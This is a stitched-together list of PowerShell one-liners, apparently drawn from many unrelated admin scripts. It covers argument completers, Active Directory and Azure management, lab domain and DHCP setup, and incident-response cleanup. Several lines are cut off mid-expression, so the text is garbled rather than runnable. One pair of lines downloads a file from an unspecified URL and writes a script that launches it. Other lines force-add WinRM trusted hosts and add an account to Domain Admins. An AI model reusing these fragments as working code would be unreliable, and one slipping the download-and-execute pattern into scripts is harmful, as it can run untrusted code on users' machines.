Register-ArgumentCompleter ` -Command 'Out-Printer' ` -Parameter 'Name' ` -ScriptBlock $function:OutPrinterNameArgumentCompletion
Register-ArgumentCompleter ` -Command 'Add-Type' ` -Parameter 'Path' ` -ScriptBlock $function:AddTypePathArgumentCompletion
Register-ArgumentCompleter ` -Command 'Add-Type' ` -Parameter 'LiteralPath' ` -ScriptBlock $function:AddTypePathArgumentCompletion
Register-ArgumentCompleter ` -Command ( 'Update-TypeData' , 'Update-FormatData' ) ` -Parameter 'AppendPath' ` -ScriptBlock $function:Ps1xmlPathArgumentCompletion
Register-ArgumentCompleter ` -Command ( 'Update-TypeData' , 'Update-FormatData' ) ` -Parameter 'PrependPath' ` -ScriptBlock $function:Ps1xmlPathArgumentCompletion
Register-ArgumentCompleter ` -Command 'Update-TypeData' ` -Parameter 'SerializationMethod' ` -ScriptBlock $function:UpdateTypeDataSerializationMethodCompleter
Register-ArgumentCompleter ` -Command 'Register-EngineEvent' ` -Parameter 'SourceIdentifier' ` -ScriptBlock $function:EventNameCompletion
Register-ArgumentCompleter ` -Command ( 'Get-TypeData' , 'Remove-TypeData' , 'Update-TypeData' ) ` -Parameter 'TypeName' ` -ScriptBlock $function:UpdateTypeTypeNameCompleter
Register-ArgumentCompleter ` -Command ( 'Disable-PSBreakpoint' ) ` -Parameter 'Id' ` -ScriptBlock $function:DisablePSBreakpointIdCompleter
Register-ArgumentCompleter ` -Command ( 'Remove-PSBreakpoint' ) ` -Parameter 'Id' ` -ScriptBlock $function:RemovePSBreakpointIdCompleter
Register-ArgumentCompleter ` -Command ( 'Disable-NetAdapter' , 'Disable-NetAdapterBinding' , 'Disable-NetAdapterChecksumOffload' , 'Disable-NetAdapterEncapsulatedPacketTaskOffload' , 'Disable-NetAdapterIPsecOffload' , 'Disable-NetAdapterLso' , 'Disable-NetAdapterPowerManagement' , 'Disable-NetAdapterQos' , 'Disable-NetAdapterRdma' , 'Disable-NetAdapterRsc' , 'Disable-NetAdapterRss' , 'Disable-NetAdapterSriov' , 'Disable-NetAdapterVmq' , 'Enable-NetAdapter' , 'Enable-NetAdapterBinding' , 'Enable-NetAdapterChecksumOffload' , 'Enable-NetAdapterEncapsulatedPacketTaskOffload' , 'Enable-NetAdapterIPsecOffload' , 'Enable-NetAdapterLso' , 'Enable-NetAdapterPowerManagement' , 'Enable-NetAdapterQos' , 'Enable-NetAdapterRdma' , 'Enable-NetAdapterRsc' , 'Enable-NetAdapterRss' , 'Enable-NetAdapterSriov' , 'Enable-NetAdapterVmq' , 'Get-NetAdapter' , 'Get-NetAdapterAdvancedProperty' , 'Get-NetAdapterBinding' , 'Get-NetAdapterChecksumOffload' , 'Get-NetAdapterEncapsulatedPacketTaskOffload' , 'Get-NetAdapterHardwareInfo' , '
Register-ArgumentCompleter ` -Command ( 'Get-NetAdapter' ) ` -Parameter 'InterfaceIndex' ` -ScriptBlock $function:NetAdapter_InterfaceIndexArgumentCompletion
Register-ArgumentCompleter ` -Command ( 'Disable-NetAdapter' , 'Disable-NetAdapterBinding' , 'Disable-NetAdapterChecksumOffload' , 'Disable-NetAdapterEncapsulatedPacketTaskOffload' , 'Disable-NetAdapterIPsecOffload' , 'Disable-NetAdapterLso' , 'Disable-NetAdapterPowerManagement' , 'Disable-NetAdapterQos' , 'Disable-NetAdapterRdma' , 'Disable-NetAdapterRsc' , 'Disable-NetAdapterRss' , 'Disable-NetAdapterSriov' , 'Disable-NetAdapterVmq' , 'Enable-NetAdapter' , 'Enable-NetAdapterBinding' , 'Enable-NetAdapterChecksumOffload' , 'Enable-NetAdapterEncapsulatedPacketTaskOffload' , 'Enable-NetAdapterIPsecOffload' , 'Enable-NetAdapterLso' , 'Enable-NetAdapterPowerManagement' , 'Enable-NetAdapterQos' , 'Enable-NetAdapterRdma' , 'Enable-NetAdapterRsc' , 'Enable-NetAdapterRss' , 'Enable-NetAdapterSriov' , 'Enable-NetAdapterVmq' , 'Get-NetAdapter' , 'Get-NetAdapterAdvancedProperty' , 'Get-NetAdapterBinding' , 'Get-NetAdapterChecksumOffload' , 'Get-NetAdapterEncapsulatedPacketTaskOffload' , 'Get-NetAdapterHardwareInfo' , '
Register-ArgumentCompleter ` -Command ( 'New-NetLbfoTeam' ) ` -Parameter 'TeamMembers' ` -ScriptBlock $function:NetLBFO_TeamMembersArgumentCompletion
Register-ArgumentCompleter ` -Command ( 'Add-NetLbfoTeamMember' , 'Add-NetLbfoTeamNic' , 'Get-NetLbfoTeam' , 'Get-NetLbfoTeamMember' , 'Get-NetLbfoTeamNic' , 'Remove-NetLbfoTeam' , 'Remove-NetLbfoTeamMember' , 'Rename-NetLbfoTeam' , 'Set-NetLbfoTeam' , 'Set-NetLbfoTeamMember' , 'Set-NetLbfoTeamNic' ) ` -Parameter 'Name' ` -ScriptBlock $function:NetLBFO_TeamNameArgumentCompletion
Register-ArgumentCompleter ` -Command ( 'Add-NetLbfoTeamMember' , 'Add-NetLbfoTeamNic' , 'Get-NetLbfoTeamMember' , 'Get-NetLbfoTeamNic' , 'Remove-NetLbfoTeamMember' , 'Remove-NetLbfoTeamNic' , 'Set-NetLbfoTeamMember' , 'Set-NetLbfoTeamNic' ) ` -Parameter 'Team' ` -ScriptBlock $function:NetLBFO_TeamNameArgumentCompletion
Register-ArgumentCompleter ` -Command ( 'Get-NetQosPolicy' , 'Set-NetQosPolicy' , 'Remove-NetQosPolicy' ) ` -Parameter 'Name' ` -ScriptBlock $function:NetQoS_PolicyNameArgumentCompletion
Register-ArgumentCompleter ` -Command ( 'Copy-NetFirewallRule' , 'Disable-NetFirewallRule' , 'Enable-NetFirewallRule' , 'Get-NetFirewallRule' , 'Remove-NetFirewallRule' , 'Rename-NetFirewallRule' , 'Set-NetFirewallRule' ) ` -Parameter 'Name' ` -ScriptBlock $function:NetFirewallRuleNameParameterCompleter
Register-ArgumentCompleter ` -Command ( 'Copy-NetFirewallRule' , 'Disable-NetFirewallRule' , 'Enable-NetFirewallRule' , 'Get-NetFirewallRule' , 'Remove-NetFirewallRule' , 'Rename-NetFirewallRule' , 'Set-NetFirewallRule' ) ` -Parameter 'DisplayName' ` -ScriptBlock $function:NetFirewallRuleDisplayNameParameterCompleter
Register-ArgumentCompleter ` -Command ( 'Get-NetIPAddress' , 'Get-NetIPConfiguration' , 'Get-NetIPInterface' , 'Get-NetNeighbor' , 'Get-NetRoute' , 'New-NetIPAddress' , 'New-NetNeighbor' , 'New-NetRoute' , 'Remove-NetIPAddress' , 'Remove-NetNeighbor' , 'Remove-NetRoute' , 'Set-NetIPAddress' , 'Set-NetIPInterface' , 'Set-NetNeighbor' , 'Set-NetRoute' ) ` -Parameter 'InterfaceAlias' ` -ScriptBlock $function:NetIPAddressInterfaceAliasParameterCompleter
Register-ArgumentCompleter ` -Command ( 'Disable-PnpDevice' , 'Enable-PnpDevice' , 'Get-PnpDevice' , 'Get-PnpDeviceProperty' ) ` -Parameter 'InstanceId' ` -ScriptBlock $function:PnpDevice_InstanceIdArgumentCompletion
Register-ArgumentCompleter ` -Command ( 'Get-PnpDevice' ) ` -Parameter 'FriendlyName' ` -ScriptBlock $function:PnpDevice_FriendlyNameArgumentCompletion
Register-ArgumentCompleter ` -Command ( 'Get-PnpDevice' ) ` -Parameter 'Class' ` -ScriptBlock $function:PnpDevice_ClassArgumentCompletion
Register-ArgumentCompleter ` -Command ( 'Get-PnpDeviceProperty' ) ` -Parameter 'KeyName' ` -ScriptBlock $function:PnpDevice_KeyNameArgumentCompletion
Register-ArgumentCompleter ` -Command ( 'Enter-PSSession' , 'Get-PSSession' , 'New-PSSession' , 'Remove-PSSession' , 'Invoke-Command' ) ` -Parameter 'VMName' ` -ScriptBlock $function:PowerShellDirect_VMNameArgumentCompletion
Register-ArgumentCompleter ` -Command ( 'Enter-PSSession' , 'Get-PSSession' , 'New-PSSession' , 'Remove-PSSession' , 'Invoke-Command' ) ` -Parameter 'VMId' ` -ScriptBlock $function:PowerShellDirect_VMIdArgumentCompletion
Register-ArgumentCompleter ` -Command ( 'Enter-PSSession' , 'Get-PSSession' , 'New-PSSession' , 'Remove-PSSession' , 'Invoke-Command' ) ` -Parameter 'ConfigurationName' ` -ScriptBlock $function:PowerShellDirect_ConfigurationArgumentCompletion
Register-ArgumentCompleter ` -Command ( 'Copy-Item' ) ` -Parameter 'ToSession' ` -ScriptBlock $function:PowerShellDirect_SessionArgumentCompletion
Register-ArgumentCompleter ` -Command ( 'Copy-Item' ) ` -Parameter 'FromSession' ` -ScriptBlock $function:PowerShellDirect_SessionArgumentCompletion
Register-ArgumentCompleter ` -Command ( 'Get-PswaAuthorizationRule' , 'Add-PswaAuthorizationRule' ) ` -Parameter 'RuleName' ` -ScriptBlock $function:PowerShellWebAccess_PswaAuthorizationRuleNameParameterCompleter
Register-ArgumentCompleter ` -Command ( 'Get-Printer' , 'Remove-Printer' , 'Set-Printer' ) ` -Parameter 'Name' ` -ScriptBlock $function:PrinterNameArgumentCompletion
Register-ArgumentCompleter ` -Command ( 'Get-PrinterDriver' , 'Remove-PrinterDriver' ) ` -Parameter 'Name' ` -ScriptBlock $function:PrinterDriverNameArgumentCompletion
Register-ArgumentCompleter ` -Command ( 'Get-PrinterPort' , 'Remove-PrinterPort' ) ` -Parameter 'Name' ` -ScriptBlock $function:PrinterPortArgumentCompletion
Register-ArgumentCompleter ` -Command 'Robocopy' ` -Native ` -ScriptBlock $function:RobocopyExeCompletion
Register-ArgumentCompleter ` -Command ( 'Disable-ScheduledTask' , 'Enable-ScheduledTask' , 'Export-ScheduledTask' , 'Get-ClusteredScheduledTask' , 'Get-ScheduledTask' , 'Get-ScheduledTaskInfo' , 'Register-ClusteredScheduledTask' , 'Register-ScheduledTask' , 'Set-ClusteredScheduledTask' , 'Set-ScheduledTask' , 'Start-ScheduledTask' , 'Stop-ScheduledTask' , 'Unregister-ClusteredScheduledTask' , 'Unregister-ScheduledTask' ) ` -Parameter 'TaskName' ` -ScriptBlock $function:ScheduledTaskTaskNameArgumentCompletion
Register-ArgumentCompleter ` -Command ( 'Disable-ScheduledTask' , 'Enable-ScheduledTask' , 'Export-ScheduledTask' , 'Get-ScheduledTask' , 'Get-ScheduledTaskInfo' , 'Register-ScheduledTask' , 'Set-ScheduledTask' , 'Start-ScheduledTask' , 'Stop-ScheduledTask' , 'Unregister-ScheduledTask' ) ` -Parameter 'TaskPath' ` -ScriptBlock $function:ScheduledTaskTaskPathArgumentCompletion
Register-ArgumentCompleter ` -Command ( 'Get-SmbShare' , 'Remove-SmbShare' , 'Set-SmbShare' , 'Block-SmbShareAccess' , 'Get-SmbShareAccess' , 'Grant-SmbShareAccess' , 'Revoke-SmbShareAccess' , 'Unblock-SmbShareAccess' ) ` -Parameter 'Name' ` -ScriptBlock $function:SmbShareNameParameterCompletion
Register-ArgumentCompleter ` -Command ( 'Get-PhysicalDisk' , 'Reset-PhysicalDisk' , 'Set-PhysicalDisk' ) ` -Parameter 'FriendlyName' ` -ScriptBlock $function:Storage_PhysicalDiskFriendlyNameParameterCompletion
Register-ArgumentCompleter ` -Command 'Mount-DiskImage' ` -Parameter 'ImagePath' ` -ScriptBlock $function:ImagePathArgumentCompletion
Register-ArgumentCompleter ` -Command ( 'Get-OdbcDriver' , 'Set-OdbcDriver' ) ` -Parameter 'Name' ` -ScriptBlock $function:Wdac_OdbcDriverNameParameterCompletion
Register-ArgumentCompleter ` -Command ( 'Add-OdbcDsn' , 'Get-OdbcDsn' , 'Remove-OdbcDsn' , 'Set-OdbcDsn' ) ` -Parameter 'Name' ` -ScriptBlock $function:Wdac_OdbcDsnNameParameterCompletion
Register-ArgumentCompleter ` -Command ( 'Add-OdbcDsn' , 'Get-OdbcDsn' , 'Remove-OdbcDsn' , 'Set-OdbcDsn' ) ` -Parameter 'DriverName' ` -ScriptBlock $function:Wdac_DriverNameParameterCompletion
Register-ArgumentCompleter ` -Command @( 'PowerShell' , "pwsh" ) ` -Native ` -ScriptBlock $function:PowerShellExeCompletion
Register-ArgumentCompleter ` -Command 'Net' ` -Native ` -ScriptBlock $function:NetExeCompletion
Register-ArgumentCompleter ` -Command 'Netsh' ` -Native ` -ScriptBlock $function:NetshExeCompletion
Register-ArgumentCompleter ` -Command 'bcdedit' ` -Native ` -ScriptBlock $function:BCDEditExeCompletion
Add-TemplateParameter -Name $ParameterName -Value $EnvValue . Value -AsType $Type -Source 'EnvironmentVariable'
Get-Command -Noun File
New-ADObject -Name $attributeName -Type attributeSchema -Path $adSchema -OtherAttributes $adAttributes
Set-ADUser -Identity $samAccountName -EmployeeID $employeeID -EmployeeNumber $employeeNumber -Replace @{ extensionAttribute8 = $extensionAttribute8 ; extensionAttribute9 = $extensionAttribute9 ; extensionAttribute10 = $extensionAttribute10 }
get-adcomputer -filter * | sort-object name | % { $_ . name }
Get-ADComputer -Filter * -Properties whenCreated , name | sort whenCreated | ft whenCreated , name -AutoSize
Get-ADComputer -Filter 'name -Like "MININT*"' -Properties name , whenCreated , IPv4Address | sort whenCreated | ft name , whenCreated , IPv4Address
Search-ADAccount -LockedOut | Unlock-AdAccount –confirm
Get-ADUser -filter * -Properties name | sort name | % { $_ . name }
Get-ADUser -filter * -Properties whenCreated , name | sort whenCreated | ft whenCreated , name -AutoSize
Get-ADUser -filter * -Properties whenCreated , name | sort whenCreated -Descending | ft whenCreated , name -AutoSize
Get-ADUser -filter * -Properties PasswordNeverExpires , name | ? { $_ . PasswordNeverExpires -eq $false } | sort name | % { $_ . name }
Get-ADUser -filter * -Properties PasswordNeverExpires , name | ? { $_ . PasswordNeverExpires -eq $True } | sort name | % { $_ . name }
Get-ADUser orinoko -Properties msExchShadowProxyAddresses | % { $_ . msExchShadowProxyAddresses }
Get-ADUser -filter * -Properties msExchShadowProxyAddresses , name | ? { $_ . msExchShadowProxyAddresses -like "*orinoko@gmail.com*" } | % { $_ . name }
Get-ADUser -Filter * -Properties name , PasswordExpired | ? { $_ . PasswordExpired -eq $true } | sort name | ft name -AutoSize
Get-ADUser -Filter * -Properties name , Enabled , PasswordExpired | Where-Object { $_ . Enabled -eq $true -and $_ . PasswordExpired -eq $true } | sort name | ft name -AutoSize
Get-ADUser -Filter * -Properties name , Enabled | Where-Object { $_ . Enabled -eq $false } | sort name | ft name -AutoSize
Get-ADUser -Filter * -Properties name , Enabled , PasswordExpired | Where-Object { $_ . Enabled -eq $false -and $_ . PasswordExpired -eq $true } | sort name | ft name -AutoSize
Get-ADUser -Filter * -Properties LastLogonDate , name , Enabled | Where-Object { $_ . Enabled -eq $true -and $_ . LastLogonDate -eq $null } | sort name | ft name -AutoSize
Get-ADUser -Filter * -Properties LastLogonDate , name , Enabled | Where-Object { $_ . Enabled -eq $true -and $_ . LastLogonDate -eq $null -and $_ . PasswordExpired -eq $true } | sort name | ft name -AutoSize
Get-ADUser -Filter * -Properties name , badPwdCount , Enabled , LockedOut , LastLogonDate , accountExpires | ? { $_ . badPwdCount -gt 0 } | ft name , badPwdCount , Enabled , LockedOut , LastLogonDate , accountExpires -AutoSize
Get-ADUser -Filter * -Properties name , LastLogonDate , badPwdCount | ? { $_ . badPwdCount -gt 0 } | sort LastLogonDate | ft name , LastLogonDate
Get-ADUser -Filter * -SearchBase "OU=Service Users, DC=contoso,DC=com" -Properties Name , EmailAddress | % { Add-ADGroupMember -identity "Contoso Service Users" -Member $_ . DistinguishedName }
Get-ADUser -filter { ( Enabled -eq $True ) } -Properties LastLogonDate | ? { ( $_ . memberof | Out-String ) -notmatch "Service Users|Domain Admins|Brokers" } | sort LastLogonDate | ft Name , SamAccountName , LastLogonDate -AutoSize
get-command -verb resolve
get-command -noun service
get-command *wmi*
get-cimclass -ClassName "*disk*"
get-wmiObject -namespace "root/cimv2" -list
get-wmiObject -namespace "root/cimv2" -list | ? name -Like "*system*"
get-netadapter -physical | ? { $_ . status -eq "Up" }
get-netadapter -physical | ? { $_ . status -eq "Up" } | % { $_ . MacAddress }
Get-ADComputer -Filter 'OperatingSystem -like "*Windows 10*"' -Properties Name , IPv4Address , OperatingSystem , LastLogonDate , CanonicalName | ft Name , IPv4Address , OperatingSystem , LastLogonDate , CanonicalName -AutoSize
Get-ADComputer -Filter * -Properties Name , IPv4Address , OperatingSystem , LastLogonDate , CanonicalName , description | sort OperatingSystem | ft Name , IPv4Address , OperatingSystem , LastLogonDate , CanonicalName , description -AutoSize
Get-Service | ? Status -eq "Stopped"
Get-Service | ? name -eq "wuauserv"
Get-Service | ? { $_ . Status -ne "stopped" } | ft Name , Status -AutoSize
Register-ArgumentCompleter -CommandName Get-DockerContainer -ParameterName Status -ScriptBlock { 'Created' , 'Restarting' , 'Running' , 'Removing' , 'Paused' , 'Exited' , 'Dead' }
New-AzResourceGroup -Name $resourceGroupName -Location $location
Remove-AzResourceGroup -Name RG
Remove-AzResource ` -ResourceGroupName RG ` -ResourceName vm1 ` -ResourceType Microsoft.Compute/virtualMachines
Get-AzResourceGroup -Name "EngineerBlog"
Stop-AzVM -ResourceGroupName "myResourceGroup" -Name "myVM"
Start-AzVM -ResourceGroupName "myResourceGroup" -Name "myVM"
Restart-AzVM -ResourceGroupName "myResourceGroup" -Name "myVM"
New-AzResourceGroup -Name "myResourceGroup" -Location "WestUS"
New-AzVm -ResourceGroupName "myResourceGroup" -Name "myVM" -Location "WestUS" -Image "UbuntuLTS" -Size "Standard_DS2_v2" -Credential ( Get-Credential ) -OpenPorts 80 , 443
New-AzStorageAccount -ResourceGroupName "myResourceGroup" -Name "mystorageaccount" -Location "WestUS" -SkuName "Standard_LRS" -Kind "StorageV2"
Get-AzVm -ResourceGroupName "myResourceGroup"
Start-AzVm -ResourceGroupName "myResourceGroup" -Name "myVM"
Stop-AzVm -ResourceGroupName "myResourceGroup" -Name "myVM" -Force
Get-AzStorageAccount
Remove-AzResourceGroup -Name "myResourceGroup" -Force
New-AzResourceGroup -Name $rgName -Location $location
Add-AzVirtualNetworkPeering -Name 'Vnet1-Vnet2' -VirtualNetwork $vnet1 -RemoteVirtualNetworkId $vnet2 . Id
Add-AzVirtualNetworkPeering -Name 'Vnet2-Vnet1' -VirtualNetwork $vnet2 -RemoteVirtualNetworkId $vnet1 . Id
Connect-AzAccount -ServicePrincipal -Tenant $env:TENANT_ID -ApplicationId $env:SERVICE_PRINCIPAL_ID -CertificateThumbprint $env:CERTIFICATE_THUMBPRINT
Set-AzContext -SubscriptionId $env:SUBSCRIPTION_ID
New-AzResourceGroup -Name $resourceGroupName -Location $location -Force
Publish-AzWebapp -ResourceGroupName $resourceGroupName -Name $webAppName -ArchivePath $deploymentPackagePath -Force
Get-AzSecurityRecommendation -ResourceId "YourResourceId"
Get-AzSecurityAlert -ResourceId "YourResourceId"
Set-AzJitNetworkAccessPolicy -ResourceGroupName "YourResourceGroup" -VirtualMachineName "YourVM" -Enabled $true
Set-AzADPrivilegedRoleAssignment -SignInName "YourUser@contoso.com" -ObjectId "YourObjectId" -RoleDefinitionId "YourRoleDefinitionId" -Scope "/subscriptions/YourSubscriptionId"
Get-WmiObject -Class win32_computersystem -ComputerName < Computer name or IP> | select username
Set-Location $projectsPath
Set-Location Tracked
Set-Location Untracked
New-Item -path $name -ItemType File | Out-Null
Get-PackageProvider -Name 'NuGet' -ForceBootstrap | Out-Null
Set-BuildEnvironment -Force
New-Item -Path $StagingFolder -ItemType 'Directory' -Force | Out-String | Write-Verbose
Copy-Item -Path $env:BHPSModuleManifest -Destination $StagingModulePath -Recurse
Import-Module -Name $StagingModulePath -ErrorAction 'Stop' -Force -Global
New-Item -Path $ArtifactFolder -ItemType 'Directory' -Force | Out-String | Write-Verbose
Set-ModuleFunctions -Name $env:BHPSModuleManifest
set-location $moduleSaveLocation ;
start-process $pathToGitExe -argumentList "clone" , $repoURL -Wait
Add-UserPSModulePath $CurUsrModulesPath ;
Get-Process
Get-Process process_name
Get-Process process_name | Select-Object -Property *
Get-Process process_name | Select-Object -Property Path , Name , Id
Get-Process | Select-Object -Property Path , Name , Id | Where-Object -Property Path -Like "*temp*"
Get-NetTCPConnection
Get-NetTCPConnection | Select-Object -Property *
Remove-ItemProperty -Path "HKCU:Software\Microsoft\Windows\CurrentVersion\Run" -Name "Run_Key_Name"
Get-ItemProperty "HKCU:Software\Microsoft\Windows\CurrentVersion\Run\Run_Key_Name"
Remove-Item \Path\to\program\program.exe
Get-ScheduledTask
Get-ScheduledTask task_name
Get-ScheduledTask task_name | Select-Object -Property *
Export-ScheduledTask -TaskName "task_name"
Get-Service
Get-Service | Where-Object Name -EQ wscsvc
Get-Service | Select-Object -ExpandProperty Name | Out-File services.txt
Compare-Object $services_baseline $services_current
Stop-Service -Name service_name
Get-Process process_name | Stop-Process
Remove-Item \Path\To\Program\program_name.exe
Unregister-ScheduledTask -TaskName "task_name"
Remove-LocalUser -Name user_name
Get-PackageProvider -Name NuGet -ForceBootstrap | Out-Null
Set-ModuleFunctions -Name $env:BHPSModuleManifest -FunctionsToExport $functions
Invoke-Expression "subst $drive /D" | Out-Null
Invoke-Expression "subst $drive '${path}'" | Out-Null
Add-Content -Path $LogPath -Value $LogEntry
Set-ADUser -EmailAddress $UsersEmail -Identity $UserName
Send-MailMessage @SendMailParameters
Set-ADAccountPassword -Identity $UserName -Reset -NewPassword $password [ 1 ]
Send-MailMessage -From $EmailSender -To $AdminEmail -Subject $PWEmailSubject -Body $PWEmailBody -SMTPServer $SMTPServer
Unlock-ADAccount -Identity $script:UserName
New-Object PSObject -Property @{
Set-StrictMode -Version Latest
Connect-AzureRmAccount
New-AzureRmResourceGroupDeployment -Name lab-resources -ResourceGroupName $Lab -TemplateFile .\infrastructure\arm-template.json
Set-Alias -Name su -Value admin
Remove-Variable identity
Get-WmiObject win32_operatingsystem | Select-Object csname , @{
Install-Module -Name PSReadLine -Force
Set-PSRepository PSGallery -InstallationPolicy Trusted
Rename-Item C:\Windows\SoftwareDistribution C:\Windows\SoftwareDistribution.old
Set-Item wsman:\localhost\Client\TrustedHosts $StorSimpleIP -Concatenate -Force
Invoke-WebRequest -Uri $url -OutFile $tempPath
Set-Content -Path $scriptPath -Value "Start-Process $tempPath"
Read-Host -Prompt "Press any key to clear out RAM or CTRL+C to quit"
Get-WinEvent -LogName Security | Where-Object { $_ . EventType -eq "Audit Success" } | Select-Object -Property TimeCreated , EventID , SourceModuleName , UserName , Message
Get-ChildItem -Path C:\Windows\* | Where-Object { $_ . LastWriteTime -gt ( Get-Date ) . AddDays ( -7 ) } | Where-Object { $_ . Name -like "*.exe" -or $_ . Name -like "*.dll" -or $_ . Name -like "*.bat" -or $_ . Name -like "*.vbs" }
Install-Module -Name Telegram.Bot -Scope CurrentUser
Import-Module Telegram.Bot
Restart-Service sppsvc
Add-Content -Path $file -Value $SavedFont | out-null
Rename-ConfigFile -ExistingName $ExistingName -TargetName $targetName -ContainerPath $ContainerPath
Rename-DisableConfigFile -ExistingName $fileName -ContainerPath $configPath
Invoke-SitecoreRoleConfigurator -ApplicationFolderPath "C:\fake" -RoleColumn "$role" -CsvSettingsFilePath "$CsvSettingsFilePath" -DryRun
Rename-Item -literalPath $filePath$defaultFileName -NewName $newFileName
Add-content $Logfile -value $logstring
get-adobject -Filter * | ft name , objectclass
get-adobject -Filter * | gm
Get-ADObject ` -Identity 'CN=Chris Romulus-Admin,OU=Users,OU=San Francisco,OU=CompanyOU,DC=romlab,DC=internal' ` -Properties * | FL
New-ADOrganizationalUnit ` -Name Users ` -Path 'OU=San Francisco,OU=CompanyOU,DC=Romlab,DC=internal' ` -Verbose
get-aduser -Filter * -Properties * | gm
Set-ADuser -Identity 'jimJ' -Enabled $True -Description 'Tim is a demo User' -Title 'Demo User'
Get-ADUser ` -filter { ( State -eq $null ) } ` -SearchBase 'OU=CompanyOU,DC=Romlab,DC=internal' -SearchScope Subtree |
get-aduser -Filter { enabled -eq $false } ` -SearchBase 'OU=Users,OU=Albany,OU=CompanyOU,DC=Romlab,DC=internal' |
Search-ADAccount -LockedOut | select Name
Get-ADComputer -Filter * -Properties * | ft Name , DNSHostName , OperatingSystem
Get-ADComputer -Identity 'Server1' -Properties *
Set-ADComputer -Identity 'Server1' -Description 'This is a Server for App/Dev Testing' -PassThru |
Get-ADComputer -Identity Server2 |
Get-ADGroup -Filter * -Properties * | FT Name , Description -AutoSize -Wrap
get-adgroup -Identity 'Domain Users' -Properties *
New-ADGroup ` -Name 'IT Users' ` -GroupCategory Security ` -GroupScope Global
Get-ADGroupMember -Identity 'Domain Users' | ft Name
Get-ADGroupMember -Identity 'IT Users'
Remove-ADGroup -Identity 'IT Users'
Get-NetIPConfiguration -CimSession $cimsession
New-netIPAddress ` -CimSession $cimsession ` -IPAddress 192.168.215.40 ` -PrefixLength 24 ` -DefaultGateway 192.168.215.2 ` -InterfaceIndex 12
Enter-PSSession -ComputerName 192.168.215.40 -Credential ( get-credential )
New-netIPAddress -IPAddress 192.168.215.20 ` -PrefixLength 24 ` -DefaultGateway 192.168.215.2 ` -InterfaceAlias Ethernet0
Tzutil.exe /s "Eastern Standard Time"
Install-WindowsFeature AD-Domain-Services -IncludeManagementTools
Import-Module ADDSDeployment
Install-ADDSForest ` -CreateDnsDelegation: $false ` -DatabasePath "C:\Windows\NTDS" ` -DomainMode "Win2012R2" ` -DomainName "romlab.internal" ` -DomainNetbiosName "romlab" ` -ForestMode "Win2012r2" ` -InstallDns: $true ` -LogPath "C:\Windows\NTDS" ` -NoRebootOnCompletion: $false ` -SysvolPath "C:\Windows\SYSVOL" ` -Force: $true
Set-DnsServerForwarder -IPAddress 4.2.2.1 -ComputerName Server1
install-windowsfeature -computerName Server1 -name DHCP -IncludeManagementTools
Add-DhcpServerInDC -IPAddress 192.168.215.20 -DnsName Server1.romlab.internal
Add-DhcpServerv4Scope -Name 'Production Scope' ` -ComputerName Server1.romlab.internal ` -StartRange 192.168.215.100 ` -EndRange 192.168.215.200 ` -SubnetMask 255.255.255.0 ` -LeaseDuration 08:00:00
Set-ADUser -Identity 'crtest' -Enabled $True
Add-ADGroupMember -Identity 'Domain Admins' -Members 'cradmin'
Install-WindowsFeature -ComputerName Server2 -Name AD-Domain-Services
Get-DnsServerResourceRecord -ComputerName Server2 -ZoneName romlab.internal -RRType Ns
Start-Transcript -Path "C:\UserData.log" -Append
C:\PROGRA~1\Amazon\AWSCLIV2\aws s3 sync ${S3Bucket} C:\inetpub\pdocommsrig
Invoke-Item "c:\$gname.csv"
Enter-PSSession -ComputerName servernamegoeshere
get-acl E:\foldernamehere |
Exit-PSSession
Get-Acl .\Bogus | Format-List
Get-WmiObject -list * -NameSpace root -Recurse -EA 0
Move-ClusterGroup -Name "Cluster Group" -Cluster CLUSTER_NAME -Node AUTOMITESRV01
Get-WmiObject -ComputerName COMPUTERNAME -Class win32_physicalmedia | Select-Object -Property Tag , SerialNumber
Get-WmiObject -Class Win32_DiskDrive -Namespace 'root\CIMV2' -ComputerName "ServerName" |
Get-Cluster -Name CLUSTER_NAME | Get-ClusterGroup | Where-Object -FilterScript { $_ . OwnerNode -eq "ServerName" }
Invoke-Command -ScriptBlock { dsquery computer domainroot -name *SERVER-00* -inactive 90 }
Get-WmiObject -ComputerName "ServerName" -Class win32_QuickFixEngineering
Get-WsusComputer -FromLastReportedStatusTime 01/01/2017 -ToLastReportedStatusTime 12/31/2017 |
Get-Cluster -Name CLUSTER_NAME | Get-ClusterGroup | Where-Object -FilterScript { $_ . Name -eq "ServerName" }
Get-SmbSession | Select-Object -Property ClientUserName , ClientComputerName , ScopeName , NumOpens , SessionID , SecondsIdle | Format-Table -AutoSize
Get-RDUserSession | ft Username , Idletime
Get-ChildItem | Where-Object -FilterScript { $_ . LastWriteTime -gt "1/01/2018" -and $_ . LastWriteTime -lt "02/01/2018" } | Move-Item -Destination .\2018\January
Get-PSDrive
Set-Location HKLM:\SOFTWARE\BROADCOM
Get-VIEvent -entity "ServerName" -MaxSamples ( [ int ] :: MaxValue ) |
Get-WmiObject -Class Win32_Share
Get-CimInstance -ClassName Win32_OperatingSystem | Select-Object -Property Caption , Version , InstallDate , OSArchitecture
Get-VM | Get-CDDrive | Where { $_ . ISOPath -ne $null } | Set-CDDrive -NoMedia -Confirm: $false
Get-WmiObject -ClassName win32_softwarefeature | Where-Object -FilterScript { $_ . ProductName -like "SQL Server*" } |
Get-CimInstance -ClassName win32_operatingsystem | select csname , lastbootuptime
Get-WmiObject -ComputerName ( Read-Host "Enter Computername" ) -Class Win32_OperatingSystem |
get-vm | Where-Object -FilterScript { $_ . CreationTime -gt "05/05/2018" } | Select-Object -Property ComputerName , VirtualMachineState , CPUCount , CPUType , MemoryAssignedMB , OperatingSystem , Location , Hostname , Owner , ObjectType , CreationTime , AddedTime , ModifiedTime | Export-Csv -NoTypeInformation -Path C:\tmp\teste.csv
Get-Job | Where-Object -FilterScript { $_ . ResultName -eq "AUTOMITE0048" } | EXPORT-CSV -NoTypeInformation -Path c:\TMP\AUTOMITE0048LOG.csv
Get-WmiObject –class Win32_processor | ft systemname , Name , DeviceID , NumberOfCores , NumberOfLogicalProcessors , Addresswidth
Get-CimInstance win32_service -Filter "startmode = 'auto' AND state != 'running' AND Exitcode !=0 " -ComputerName sql1 | select name , startname , exitcode
Get-Cluster -Domain br.automite.net
Get-WmiObject -class MSFC_FCAdapterHBAAttributes -namespace "root\WMI" | ForEach-Object { ( ( $_ . NodeWWN ) | ForEach-Object { "{0:x}" -f $_ } ) -join ":" }
Get-ADUser -Identity Domain_User -Properties * | Select-Object -Property PasswordLastSet
Get-VMHost | Select Name , @{ n = "ManagementIP" ; e = { Get-VMHostNetworkAdapter -VMHost $_ -VMKernel | ? { $_ . ManagementTrafficEnabled } | % { $_ . Ip } } } , PowerState , Manufacturer , Model
